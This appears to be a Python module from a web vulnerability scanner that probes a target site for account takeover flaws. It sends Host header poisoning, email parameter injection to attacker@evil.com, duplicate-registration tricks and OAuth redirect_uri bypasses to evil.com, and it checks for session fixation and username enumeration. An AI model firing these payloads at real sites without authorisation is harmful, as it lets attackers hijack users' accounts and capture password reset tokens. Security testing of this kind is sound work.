"""
cyberm4fia-scanner - Account Takeover Scanner
Detects account takeover vectors: password reset flaws, registration bypass,
session fixation, OAuth misconfiguration, and response manipulation hints.
Based on Az0x7/vulnerability-Checklist ATO and reset password checklists.
"""

from urllib.parse import urlparse, urlencode

from utils.colors import log_info, log_success
from utils.request import smart_request, ScanExceptions

# ─────────────────────────────────────────────────────
# Password Reset Attack Payloads
# ─────────────────────────────────────────────────────
HOST_HEADER_PAYLOADS = [
    "evil.com", "attacker.com", "localhost",
    "127.0.0.1", "0.0.0.0",
]

EMAIL_PARAM_PAYLOADS = [
    # Double parameter injection
    ("email", "victim@target.com&email=attacker@evil.com"),
    ("email", "victim@target.com%0a%0dcc:attacker@evil.com"),
    ("email", "victim@target.com,attacker@evil.com"),
    ("email", "victim@target.com%20attacker@evil.com"),
    # Unicode tricks
    ("email", "vıctim@target.com"),     # Turkish dotless i
    ("email", "victim@target.com\u0000"),  # Null byte
    ("email", " victim@target.com"),    # Leading space
    ("email", "victim@target.com "),    # Trailing space
]

# ─────────────────────────────────────────────────────
# Registration Bypass Payloads
# ─────────────────────────────────────────────────────
DUPLICATE_EMAIL_TRICKS = [
    "victim@target.com",
    " victim@target.com",       # Leading space
    "victim@target.com ",       # Trailing space
    "Victim@target.com",        # Capitalized
    "victim+attacker@target.com",  # Plus addressing
    "victim@Target.com",        # Domain case
]

# ─────────────────────────────────────────────────────
# OAuth Redirect URI Payloads
# ─────────────────────────────────────────────────────
OAUTH_REDIRECT_PAYLOADS = [
    "https://evil.com",
    "https://evil.com@target.com",
    "https://target.com.evil.com",
    "https://target.com%40evil.com",
    "https://target.com%252f%252fevil.com",
    "//evil.com",
    "///evil.com",
    "https://target.com/callback?next=https://evil.com",
]

# ─────────────────────────────────────────────────────
# Common Reset/Register/Login Endpoints
# ─────────────────────────────────────────────────────
RESET_PATHS = [
    "/forgot-password", "/reset-password", "/password/reset",
    "/api/v1/password/reset", "/api/auth/forgot",
    "/account/forgot", "/user/reset",
]
REGISTER_PATHS = [
    "/register", "/signup", "/sign-up", "/api/v1/register",
    "/api/auth/register", "/account/create",
]
LOGIN_PATHS = [
    "/login", "/signin", "/sign-in", "/api/v1/login",
    "/api/auth/login",
]


def _find_endpoints(url, paths, delay=0):
    """Find which endpoints exist on the target."""
    found = []
    parsed = urlparse(url)
    for path in paths:
        try:
            test_url = f"{parsed.scheme}://{parsed.netloc}{path}"
            resp = smart_request("get", test_url, delay=delay, timeout=5)
            if resp.status_code in (200, 301, 302, 405):
                found.append(test_url)
        except ScanExceptions:
            pass
    return found


def _test_host_header_poisoning(reset_urls, delay=0):
    """Test password reset with Host header injection."""
    findings = []

    for reset_url in reset_urls:
        for host in HOST_HEADER_PAYLOADS:
            try:
                resp = smart_request(
                    "post", reset_url,
                    data={"email": "test@example.com"},
                    headers={"Host": host},
                    delay=delay, timeout=5,
                )
                if resp.status_code in (200, 302):
                    body = resp.text.lower()
                    if "error" not in body and "invalid" not in body:
                        findings.append({
                            "type": "Account Takeover",
                            "vuln": "Host Header Poisoning",
                            "payload": f"Host: {host}",
                            "severity": "CRITICAL",
                            "description": f"Password reset accepted with Host: {host}",
                            "url": reset_url,
                        })
                        log_success(f"🔥 Host header poisoning! {host}")
                        return findings
            except ScanExceptions:
                pass
    return findings


def _test_email_injection(reset_urls, delay=0):
    """Test password reset with email parameter injection."""
    findings = []

    for reset_url in reset_urls:
        for param, payload in EMAIL_PARAM_PAYLOADS:
            try:
                resp = smart_request(
                    "post", reset_url,
                    data={param: payload},
                    delay=delay, timeout=5,
                )
                if resp.status_code in (200, 302):
                    body = resp.text.lower()
                    success_indicators = [
                        "sent", "email", "check", "reset", "success",
                    ]
                    if any(kw in body for kw in success_indicators):
                        findings.append({
                            "type": "Account Takeover",
                            "vuln": "Email Parameter Injection",
                            "payload": payload[:50],
                            "severity": "HIGH",
                            "description": f"Reset accepted with injected email param",
                            "url": reset_url,
                        })
                        log_success(f"🔥 Email injection! {payload[:30]}")
                        return findings
            except ScanExceptions:
                pass
    return findings


def _test_registration_bypass(register_urls, delay=0):
    """Test duplicate email registration with whitespace/unicode tricks."""
    findings = []

    for register_url in register_urls:
        for email_trick in DUPLICATE_EMAIL_TRICKS[1:]:  # Skip the first (normal) one
            try:
                resp = smart_request(
                    "post", register_url,
                    json={
                        "email": email_trick,
                        "username": "cybm4fia_test",
                        "password": "Test12345!",
                    },
                    headers={"Content-Type": "application/json"},
                    delay=delay, timeout=5,
                )
                if resp.status_code in (200, 201):
                    body = resp.text.lower()
                    if "error" not in body and "exists" not in body:
                        findings.append({
                            "type": "Account Takeover",
                            "vuln": "Registration Bypass",
                            "payload": email_trick,
                            "severity": "HIGH",
                            "description": f"Duplicate registration via: {email_trick}",
                            "url": register_url,
                        })
                        log_success(f"🔥 Registration bypass! {email_trick}")
                        return findings
            except ScanExceptions:
                pass
    return findings


def _test_session_fixation(login_urls, delay=0):
    """Test session fixation by checking if pre-set session survives login."""
    findings = []

    for login_url in login_urls:
        try:
            # Step 1: Get a session cookie
            resp1 = smart_request("get", login_url, delay=delay, timeout=5)
            cookies = dict(resp1.cookies) if hasattr(resp1, 'cookies') else {}

            if not cookies:
                continue

            # step 2: Check if the same session ID persists after login attempt
            resp2 = smart_request(
                "post", login_url,
                data={"username": "test", "password": "test"},
                delay=delay, timeout=5,
            )
            new_cookies = dict(resp2.cookies) if hasattr(resp2, 'cookies') else {}

            # If any session cookie stayed the same, potential fixation
            for key in cookies:
                if key.lower() in ("sessionid", "phpsessid", "jsessionid", "sid", "session"):
                    if key in new_cookies and cookies[key] == new_cookies[key]:
                        findings.append({
                            "type": "Account Takeover",
                            "vuln": "Session Fixation",
                            "payload": f"{key}={cookies[key][:20]}...",
                            "severity": "HIGH",
                            "description": f"Session cookie {key} not rotated after login",
                            "url": login_url,
                        })
                        log_success(f"🔥 Session fixation! {key} not rotated")
                        return findings
        except ScanExceptions:
            pass
    return findings


def _test_oauth_redirect(url, delay=0):
    """Test OAuth redirect_uri manipulation."""
    findings = []
    parsed = urlparse(url)

    # Common OAuth authorize paths
    oauth_paths = [
        "/oauth/authorize", "/auth/authorize", "/oauth2/authorize",
        "/api/oauth/authorize", "/connect/authorize",
    ]

    for path in oauth_paths:
        for redirect_payload in OAUTH_REDIRECT_PAYLOADS:
            try:
                params = urlencode({
                    "client_id": "test",
                    "redirect_uri": redirect_payload,
                    "response_type": "code",
                })
                test_url = f"{parsed.scheme}://{parsed.netloc}{path}?{params}"
                resp = smart_request(
                    "get", test_url, delay=delay, timeout=5,
                    follow_redirects=False,
                )
                if resp.status_code in (302, 301):
                    location = resp.headers.get("location", "")
                    if "evil.com" in location:
                        findings.append({
                            "type": "Account Takeover",
                            "vuln": "OAuth Redirect Manipulation",
                            "payload": redirect_payload,
                            "severity": "CRITICAL",
                            "description": f"OAuth redirected to: {location}",
                            "url": test_url,
                        })
                        log_success(f"🔥 OAuth redirect! → {location}")
                        return findings
            except ScanExceptions:
                pass
    return findings


def _test_username_enumeration(login_urls, delay=0):
    """Detect username enumeration via error message differences."""
    findings = []

    for login_url in login_urls:
        try:
            # Request with nonexistent user
            resp1 = smart_request(
                "post", login_url,
                data={"username": "cybm4fia_nonexistent_user_xz9", "password": "wrong"},
                delay=delay, timeout=5,
            )
            # Request with common user
            resp2 = smart_request(
                "post", login_url,
                data={"username": "admin", "password": "wrong"},
                delay=delay, timeout=5,
            )

            # Different response sizes or status = enumerable
            if resp1.status_code == resp2.status_code:
                len_diff = abs(len(resp1.text) - len(resp2.text))
                if len_diff > 20:
                    findings.append({
                        "type": "Account Takeover",
                        "vuln": "Username Enumeration",
                        "payload": "Different error messages",
                        "severity": "MEDIUM",
                        "description": f"Response differs by {len_diff} chars for valid vs invalid user",
                        "url": login_url,
                    })
                    log_success(f"🔍 Username enumeration! {len_diff} char difference")
                    return findings
        except ScanExceptions:
            pass
    return findings


def scan_account_takeover(url, delay=0):
    """
    Main Account Takeover scanner entry point.
    Tests password reset, registration, session, OAuth, and login flows.
    """
    log_info("Starting Account Takeover Scanner...")
    all_findings = []

    # Discover endpoints
    log_info("  → Discovering reset/register/login endpoints...")
    reset_urls = _find_endpoints(url, RESET_PATHS, delay)
    register_urls = _find_endpoints(url, REGISTER_PATHS, delay)
    login_urls = _find_endpoints(url, LOGIN_PATHS, delay)

    log_info(f"  Found: {len(reset_urls)} reset, {len(register_urls)} register, {len(login_urls)} login")

    # Password Reset Attacks
    if reset_urls:
        log_info("  → Testing Host header poisoning on reset...")
        all_findings.extend(_test_host_header_poisoning(reset_urls, delay))
        log_info("  → Testing email parameter injection...")
        all_findings.extend(_test_email_injection(reset_urls, delay))

    # Registration Attacks
    if register_urls:
        log_info("  → Testing registration bypass...")
        all_findings.extend(_test_registration_bypass(register_urls, delay))

    # Session Fixation
    if login_urls:
        log_info("  → Testing session fixation...")
        all_findings.extend(_test_session_fixation(login_urls, delay))
        log_info("  → Testing username enumeration...")
        all_findings.extend(_test_username_enumeration(login_urls, delay))

    # OAuth Redirect
    log_info("  → Testing OAuth redirect manipulation...")
    all_findings.extend(_test_oauth_redirect(url, delay))

    if not all_findings:
        log_info("No account takeover vectors detected.")

    log_success(f"Account takeover scan complete. {len(all_findings)} finding(s).")
    return all_findings
